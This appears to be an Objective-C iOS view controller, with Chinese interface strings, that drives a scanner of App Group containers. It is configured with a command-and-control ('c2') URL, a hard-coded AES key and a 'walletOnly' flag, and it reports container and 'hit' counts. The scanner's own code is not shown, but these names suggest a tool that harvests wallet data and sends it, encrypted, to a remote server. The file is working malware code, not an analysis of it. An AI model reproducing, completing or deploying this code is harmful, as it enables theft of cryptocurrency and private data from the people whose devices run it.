#import "ViewController.h"
#import "Config.h"
#import "WQScanner.h"

@interface ViewController ()
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UILabel *statusLabel;
@property (nonatomic, strong) WQScanner *scanner;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor colorWithRed:0.04 green:0.04 blue:0.06 alpha:1.0];

    self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 60, self.view.bounds.size.width - 40, 44)];
    self.statusLabel.textColor = [UIColor colorWithRed:0.98 green:0.75 blue:0.15 alpha:1.0];
    self.statusLabel.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightMedium];
    self.statusLabel.text = @"初始化...";
    [self.view addSubview:self.statusLabel];

    self.logView = [[UITextView alloc] initWithFrame:CGRectMake(16, 110,
        self.view.bounds.size.width - 32, self.view.bounds.size.height - 130)];
    self.logView.backgroundColor = [UIColor colorWithRed:0.08 green:0.08 blue:0.11 alpha:1.0];
    self.logView.textColor = [UIColor colorWithRed:0.78 green:0.78 blue:0.82 alpha:1.0];
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 8;
    [self.view addSubview:self.logView];

    NSLog(@"[WQ] app group = %@", kAppGroup);
    NSLog(@"[WQ] c2 = %@", kC2URL);

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW,
                                 (int64_t)(kScanDelaySeconds * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        [self startScan];
    });
}

- (void)log:(NSString *)fmt, ... {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", s];
        NSRange r = NSMakeRange(self.logView.text.length, 0);
        [self.logView scrollRangeToVisible:r];
    });
    NSLog(@"[WQ] %@", s);
}

- (void)setStatus:(NSString *)s {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = s;
    });
}

- (void)startScan {
    [self setStatus:@"检查 App Group..."];

    NSURL *g = [[NSFileManager defaultManager]
                containerURLForSecurityApplicationGroupIdentifier:kAppGroup];
    if (!g) {
        [self log:@"✗ App Group 不可用: %@", kAppGroup];
        [self log:@"  检查 entitlements 是否包含该 group，"];
        [self log:@"  以及 App ID 是否已绑定该 group。"];
        [self setStatus:@"App Group 缺失"];
        return;
    }
    [self log:@"✓ App Group: %@", g.path];

    // 解密 AES key
    NSData *key = [self dataFromHex:kAESKeyHex];
    if (key.length != 32) {
        [self log:@"✗ AES key 长度不是 32 字节（%lu）", (unsigned long)key.length];
        [self setStatus:@"密钥配置错误"];
        return;
    }

    self.scanner = [[WQScanner alloc] init];
    self.scanner.appGroup    = kAppGroup;
    self.scanner.c2URL       = kC2URL;
    self.scanner.aesKey      = key;
    self.scanner.walletOnly  = kWalletOnly;

    __weak typeof(self) weakSelf = self;
    self.scanner.progressBlock = ^(NSString *msg) {
        [weakSelf log:@"%@", msg];
        [weakSelf setStatus:msg];
    };
    self.scanner.finishBlock = ^(NSInteger containers, NSInteger hits, NSError *err) {
        if (err) {
            [weakSelf log:@"✗ 扫描出错: %@", err.localizedDescription];
            [weakSelf setStatus:@"出错"];
        } else {
            [weakSelf log:@"─── 完成 ───"];
            [weakSelf log:@"容器 %ld / 命中 %ld", (long)containers, (long)hits];
            [weakSelf setStatus:[NSString stringWithFormat:
                @"完成  容器 %ld  命中 %ld", (long)containers, (long)hits]];
        }
    };

    [self setStatus:@"扫描中..."];
    [self.scanner start];
}

- (NSData *)dataFromHex:(NSString *)hex {
    NSMutableData *d = [NSMutableData data];
    const char *c = hex.UTF8String;
    size_t n = strlen(c);
    for (size_t i = 0; i + 1 < n; i += 2) {
        unsigned int b = 0;
        sscanf(c + i, "%2x", &b);
        [d appendBytes:&b length:1];
    }
    return d;
}

@end
